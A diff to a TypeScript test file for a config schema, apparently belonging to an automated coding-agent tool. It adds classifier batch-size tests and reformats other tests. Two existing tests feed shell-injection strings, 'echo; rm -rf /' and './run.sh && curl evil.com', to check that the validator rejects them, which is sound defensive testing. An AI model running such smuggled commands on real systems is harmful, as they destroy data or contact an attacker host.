@@ -37,6 +37,7 @@ describe('ConfigSchema', () => {
     const result = ConfigSchema.safeParse(validConfig);
     if (result.success) {
       expect(result.data.pollIntervalMs).toBe(30000);
+      expect(result.data.classifierBatchSize).toBe(10);
       expect(result.data.governance).toEqual({
         documentPath: 'FACTORY_RULES.md',
         maxPrLinesChanged: 2000,
@@ -59,14 +60,19 @@ describe('ConfigSchema', () => {
 
     expect(result.success).toBe(true);
     if (result.success) {
-      expect(result.data.agentScopes.worker?.writePaths).toEqual(['src/generated/**']);
+      expect(result.data.agentScopes.worker?.writePaths).toEqual([
+        'src/generated/**',
+      ]);
     }
   });
 
   it('accepts governance guardrail overrides', () => {
     const result = ConfigSchema.safeParse({
       ...validConfig,
-      governance: { documentPath: '.auto-claude/FACTORY_RULES.md', maxPrLinesChanged: 750 },
+      governance: {
+        documentPath: '.auto-claude/FACTORY_RULES.md',
+        maxPrLinesChanged: 750,
+      },
     });
 
     expect(result.success).toBe(true);
@@ -75,13 +81,47 @@ describe('ConfigSchema', () => {
     }
   });
 
+  it('accepts classifier batch size override', () => {
+    const result = ConfigSchema.safeParse({
+      ...validConfig,
+      classifierBatchSize: 25,
+    });
+
+    expect(result.success).toBe(true);
+    if (result.success) {
+      expect(result.data.classifierBatchSize).toBe(25);
+    }
+  });
+
+  it('rejects invalid classifier batch size', () => {
+    expect(
+      ConfigSchema.safeParse({ ...validConfig, classifierBatchSize: 0 })
+        .success,
+    ).toBe(false);
+    expect(
+      ConfigSchema.safeParse({ ...validConfig, classifierBatchSize: 101 })
+        .success,
+    ).toBe(false);
+  });
+
   it('accepts IPv4 controlHost values (#248)', () => {
-    expect(ConfigSchema.safeParse({ ...validConfig, controlHost: '127.0.0.1' }).success).toBe(true);
-    expect(ConfigSchema.safeParse({ ...validConfig, controlHost: '0.0.0.0' }).success).toBe(true);
+    expect(
+      ConfigSchema.safeParse({ ...validConfig, controlHost: '127.0.0.1' })
+        .success,
+    ).toBe(true);
+    expect(
+      ConfigSchema.safeParse({ ...validConfig, controlHost: '0.0.0.0' })
+        .success,
+    ).toBe(true);
   });
 
   it('rejects hostname controlHost values (#248)', () => {
-    for (const controlHost of ['localhost', 'my-server.local', 'example.com', '::1']) {
+    for (const controlHost of [
+      'localhost',
+      'my-server.local',
+      'example.com',
+      '::1',
+    ]) {
       const result = ConfigSchema.safeParse({ ...validConfig, controlHost });
 
       expect(result.success).toBe(false);
@@ -89,14 +129,20 @@ describe('ConfigSchema', () => {
   });
 
   it('rejects invalid adapter', () => {
-    const result = ConfigSchema.safeParse({ ...validConfig, adapter: 'invalid' });
+    const result = ConfigSchema.safeParse({
+      ...validConfig,
+      adapter: 'invalid',
+    });
     expect(result.success).toBe(false);
   });
 
   it('rejects gate1Commands with shell injection characters', () => {
     const result = ConfigSchema.safeParse({
       ...validConfig,
-      validation: { ...validConfig.validation, gate1Commands: ['echo; rm -rf /'] },
+      validation: {
+        ...validConfig.validation,
+        gate1Commands: ['echo; rm -rf /'],
+      },
     });
     expect(result.success).toBe(false);
   });
@@ -104,7 +150,10 @@ describe('ConfigSchema', () => {
   it('rejects holdoutCommand with shell injection characters', () => {
     const result = ConfigSchema.safeParse({
       ...validConfig,
-      validation: { ...validConfig.validation, holdoutCommand: './run.sh && curl evil.com' },
+      validation: {
+        ...validConfig.validation,
+        holdoutCommand: './run.sh && curl evil.com',
+      },
     });
     expect(result.success).toBe(false);
   });
@@ -137,10 +186,16 @@ describe('zod v4 compatibility', () => {
 
   it('applies nested defaults when outer object is omitted', () => {
     // Regression: zod v4 requires explicit default values for .default()
-    const result = ConfigSchema.safeParse({ dailyBudget: 50, perRunBudget: 10 });
+    const result = ConfigSchema.safeParse({
+      dailyBudget: 50,
+      perRunBudget: 10,
+    });
     expect(result.success).toBe(true);
     if (result.success) {
-      expect(result.data.branches).toEqual({ staging: 'staging', production: 'main' });
+      expect(result.data.branches).toEqual({
+        staging: 'staging',
+        production: 'main',
+      });
       expect(result.data.validation.maxFixCycles).toBe(3);
       expect(result.data.diagnosis.confidenceThreshold).toBe(0.7);
       expect(result.data.warmup.threshold).toBe(10);
